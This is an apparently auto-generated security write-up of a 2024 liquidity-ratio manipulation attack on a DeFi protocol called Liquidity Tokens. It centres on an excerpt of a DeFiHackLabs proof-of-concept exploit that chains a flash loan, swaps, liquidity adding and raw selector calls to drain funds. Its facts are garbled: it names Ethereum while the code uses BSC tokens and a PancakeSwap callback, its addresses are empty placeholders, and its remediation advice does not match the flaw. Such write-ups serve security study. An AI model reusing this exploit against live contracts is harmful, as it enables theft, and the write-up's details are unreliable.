# Liquidity Tokens — Liquidity Token Ratio Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-12 |
| **Protocol** | Liquidity Tokens |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://etherscan.io/address/0x) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Liquidity token ratio manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Liquiditytokens_exp.sol) |

---
## 1. Vulnerability Overview

Liquidity Tokens is a DeFi protocol operating on the Ethereum chain that suffered a **liquidity manipulation** attack on 2024-05-12.
The attacker exploited liquidity token ratio manipulation to cause approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Liquidity Manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Liquidity token ratio manipulation
// The attacker exploits this logic to obtain illegitimate profit

// Liquidity Tokens interface — functions vulnerable to liquidity ratio manipulation
interface Imoney {
    // ❌ Vulnerable: stakes() calculates shares based on current LP balance ratio
    // Temporarily injecting liquidity via Uni_Pair_V3.flash distorts the LP ratio
    // when stakes() is called, allowing excessive share allocation
    function stakes() external;

    // ❌ Vulnerable: Send() transfers tokens based on manipulated share amounts
    function Send() external;
}

interface Uni_Pair_V3 {
    // ❌ Vulnerable: stakes() + Send() called sequentially inside flash callback (uniswapV3FlashCallback)
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface Uni_Pair_V2 {
    function getReserves() external view returns (uint256 reserve0, uint256 reserve1, uint32 blockTimestampLast);
}

interface Uni_Router_V2 {
    function addLiquidity(
        address tokenA, address tokenB,
        uint amountADesired, uint amountBDesired,
        uint amountAMin, uint amountBMin,
        address to, uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external;
}

// ✅ Correct implementation: Block liquidity calculation during flash loans + use TWAP
function safeStakes() external {
    // ✅ Block share calculation while a flash loan is active
    require(!flashLoanActive, "Stakes: flash loan active");
    // ✅ Detect sudden changes by comparing current and previous block LP balances
    uint256 currentLiquidity = getLPBalance();
    require(
        currentLiquidity <= lastRecordedLiquidity * (1e18 + MAX_LIQUIDITY_CHANGE) / 1e18,
        "Stakes: suspicious liquidity spike"
    );
    lastRecordedLiquidity = currentLiquidity;
    _calculateStakes();
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── Liquidity Tokens Contract
  │
  ▼
[Send Malicious Transaction] ─── Call Vulnerable Function
  │                                (Bypass Validation)
  ▼
[Drain Assets] ──────────────── Secure Profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - Liquiditytokens_exp.sol
// Chain: Ethereum | Date: 2024-05-12

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker BUSD before exploit", BUSD.balanceOf(address(this)), 18);

        Pool.flash(address(this), 19_000_000 ether, 0, "0x123");

        emit log_named_decimal_uint("[End] Attacker BUSD after exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker Vow after exploit", Vow.balanceOf(address(this)), 18);
    }

    // function attack() internal {
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        //Step 1
        //Tx:https://app.blocksec.com/explorer/0x8d27f9a15b1834e5f9e55d47ec32d01e7fe54f93cfc6ea9d4e8c5fbe72756897
        swap_token_to_tokens(address(WBNB), address(BUSD), address(Vow), 2 ether);
        swap_token_to_token(address(Vow), address(Vusd), 854_320_785_746_786_696_066);
        Vusd.approve(address(Router), 2_000_000 ether);
        Vow.approve(address(Router), 2_000_000 ether);
        Router.addLiquidity(
            address(Vow),
            address(Vusd),
            854_320_785_746_786_696_066,
            1_182_464_186_867_710_570_390,
            0,
            0,
            address(this),
            block.timestamp + 500
        );
        address HelperExploitContract = create_contract(1);
        //function join(address R e) public
        address(VulnContract).call(abi.encodeWithSelector(bytes4(0x28ffe6c8), address(HelperExploitContract)));

        //Step 2
        swap_token_to_token(address(BUSD), address(Vow), 19_000_000 ether);

        Pair.transfer(address(HelperExploitContract), 1 ether);

        Imoney(HelperExploitContract).stakes();

        Pair.approve(address(VulnContract_2), type(uint256).max);

        //stake()
        address(VulnContract_2).call(abi.encodeWithSelector(bytes4(0xa694fc3a), 942_253_377_026_177_767_815));

        Imoney(HelperExploitContract).Send();

        Vow.approve(address(Tlnswap), type(uint256).max);
        TLN.approve(address(Tlnswap), type(uint256).max);

        //function lock(uint256 amount) external(Use function selector)
        address(Tlnswap).call(abi.encodeWithSelector(bytes4(0xdd467064), 3_199_510_344_301_177_871_795_565));

        swap_token_to_token(address(Vusd), address(Vow), 3_199_510 ether);
        swap_token_to_token(address(Vow), address(BUSD), 800_000 ether);

        BUSD.transfer(msg.sender, 19_000_000 * 1e18 + fee0);
    }

    function swap_token_to_tokens(address a, address b, address c, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](3);
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criterion | Details |
|-----------|------|
| **DASP Top 10** | Logic Vulnerability |
| **Attack Type** | Smart Contract Bug |
| **Vulnerability Category** | DeFi Attack |
| **Attack Complexity** | Medium |
| **Prerequisites** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to the exploited functions
2. **Assess damage**: Quantify lost assets and identify affected users
3. **Notify relevant parties**: Immediately inform related DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation protection (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on the current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 separate audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Liquidity manipulation attacks are preventable**: Proper validation and pattern application can defend against them
2. **Consider economic incentives**: Every function must be designed with the attacker's economic motivations in mind
3. **Audit priorities**: Functions that directly handle assets should be the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon an attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-05-12** Liquidity Tokens incident reaffirms the danger of **liquidity manipulation** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Recommend strengthening community-level security information sharing

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC original: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Liquiditytokens_exp.sol)*